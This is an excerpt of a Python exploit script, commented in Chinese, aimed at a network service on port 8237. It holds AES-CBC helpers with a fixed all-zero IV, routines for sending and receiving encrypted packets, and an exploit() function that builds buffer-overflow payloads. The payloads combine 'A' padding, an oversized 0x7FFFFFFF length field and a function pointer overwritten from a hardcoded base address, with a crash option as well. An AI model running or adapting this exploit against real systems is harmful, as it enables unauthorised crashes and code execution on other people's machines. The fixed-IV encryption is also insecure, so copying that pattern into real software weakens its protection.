...
IV = bytes(16)  # 固定为 16 个 0x00

def encrypt_aes_cbc_128(data: bytes, key: bytes) -> bytes:
    """
    AES-128-CBC 加密
    :param data: 明文数据（任意长度）
    :param key:  16 字节密钥
    :return:     加密后的密文（长度是 16 的倍数）
    """
    if len(key) != 16:
        raise ValueError("Key must be 16 bytes long")
    padded_data = pad(data, AES.block_size)          # PKCS#7 填充
    cipher = AES.new(key, AES.MODE_CBC, iv=IV)
    return cipher.encrypt(padded_data)


def decrypt_aes_cbc_128(data: bytes, key: bytes) -> bytes:
    """
    AES-128-CBC 解密
    :param data: 密文数据（长度必须是 16 的倍数）
    :param key:  16 字节密钥
    :return:     解密后的明文（已去除填充）
    """
    if len(key) != 16:
...
def aestest():
    ...
    plain = b"Hello, AES-CBC-128! This is a test message."

    cipher = encrypt_aes_cbc_128(plain, key)
    print(f"Ciphertext (hex): {cipher.hex()}")

    decrypted = decrypt_aes_cbc_128(cipher, key)
...
def send_encrypted(sock, flags, cmd, payload=b'', **kw):
    ...
    if (flags & 0x4100) :
        if (len(payload)> 0) :
            payload = encrypt_aes_cbc_128(payload,hdr[8:32] )
        encrypted_hdr = des_encrypt(hdr[8:32] )
        hdr = hdr[:8] + encrypted_hdr
...
def recv_packet(sock, timeout=10):
    ...
    if hdr['payload_len'] > 0:
        ...
        if flags & 0x4100:
            ...
            payload = decrypt_aes_cbc_128(payload,hdr[8:24])
...
def exploit(host, port, crash=True):
    ...
    hdr, first_pack = recv_packet(sock)
    ...
    payload_len = 32
    #safe_payload = struct.pack('<III', 1, 0, payload_len) + b'\x41\x00' * payload_len + b'\x00\x00'
    
    safe_payload = struct.pack('<III', 1, 0, payload_len)
    safe_payload += b'\x41'*0x50        #offset is 16 + 24 = 40
    safe_payload += b'\x01\x01\x01\x01\x01\x01\x01\x80'
    func_ptr = 0x00007FF7663F0000 + 0x17D5658
    safe_payload += func_ptr.to_bytes(8, byteorder='little')
    ...
    if 1:
        ...
        overflow_payload = struct.pack('<III', 2, 3, 0x7FFFFFFF)
        overflow_payload += b'\x41\x00' * 512  # 1024字节宽字符格式的'A'
        overflow_payload += b'\x00\x00'         # 字符串结束符
    else:
        #raw_size = 64 - 30
        overflow_payload = struct.pack('<III', 1, 0, 0x7FFFFFFF)
        overflow_payload = b'\x41'*0x68
        overflow_payload += b'\x01\x01\x01\x01\x01\x01\x01\x92'
        func_ptr = 0x7FF6E98F0000 + 0x17D5658
        overflow_payload += func_ptr.to_bytes(8, byteorder='little')
...
if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '192.168.221.136'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8237
    mode = sys.argv[3] if len(sys.argv) > 3 else 'crash'
    print (f"host:{host},port:{port},mode:{mode}")
